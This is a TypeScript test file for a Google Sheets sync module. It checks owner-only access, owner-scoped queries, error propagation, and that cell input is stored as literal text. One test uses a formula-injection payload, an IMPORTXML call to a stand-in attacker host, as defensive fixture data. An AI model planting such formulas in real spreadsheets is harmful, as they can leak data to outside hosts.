import { test } from "node:test";
import assert from "node:assert/strict";
import { SheetsTools, sheetRequests } from "../src/sheets.js";
import type { Database } from "../src/db.js";
test("spreadsheet cells are literal strings and stale rows clear atomically", () => {
  const requests = sheetRequests([
    [["Header"], ['=IMPORTXML("https://evil.test","//x")']],
  ]);
  const update = requests.find((r) => "updateCells" in r)!.updateCells!;
  assert.deepEqual(update.range, { sheetId: 0 });
  assert.ok(
    update.rows[1]!.values[0]!.userEnteredValue.stringValue.startsWith(
      "=IMPORTXML",
    ),
  );
  assert.equal(update.fields, "userEnteredValue");
  assert.ok(!JSON.stringify(requests).includes("formulaValue"));
});
test("Sheets rejects other users before any network or database access", async () => {
  let calls = 0;
  const sheets = new SheetsTools(
    {
      query: async () => {
        calls++;
        throw Error();
      },
    } as unknown as Database,
    {
      owner: "alice",
      clientId: "id",
      clientSecret: "secret",
      refreshToken: "refresh",
      spreadsheetId: "sheet",
    },
    async () => {
      calls++;
      throw Error();
    },
  );
  await assert.rejects(() => sheets.sync("bob"));
  assert.equal(calls, 0);
});
test("Sheets writes a single owner-scoped snapshot and propagates provider failures", async () => {
  let calls = 0;
  let fail = false;
  const db = {
    query: async (sql: string, args: unknown[]) => {
      assert.deepEqual(args, ["alice"]);
      assert.match(sql, /WHERE user_id=\$1/);
      return { rows: [{ jobs: [], requirements: [], tasks: [] }] };
    },
  } as unknown as Database;
  const sheets = new SheetsTools(
    db,
    {
      owner: "alice",
      clientId: "id",
      clientSecret: "secret",
      refreshToken: "refresh",
      spreadsheetId: "sheet",
    },
    async (url, init) => {
      calls++;
      if (String(url).includes("oauth2"))
        return Response.json({ access_token: "token" });
      assert.equal(
        String(url),
        "https://sheets.googleapis.com/v4/spreadsheets/sheet:batchUpdate",
      );
      assert.equal(
        JSON.parse(init!.body as string).requests.filter(
          (r: any) => r.updateCells,
        ).length,
        3,
      );
      return fail ? new Response("denied", { status: 403 }) : Response.json({});
    },
  );
  assert.equal((await sheets.sync("alice")).synced, true);
  assert.equal(calls, 2);
  fail = true;
  await assert.rejects(() => sheets.sync("alice"));
});
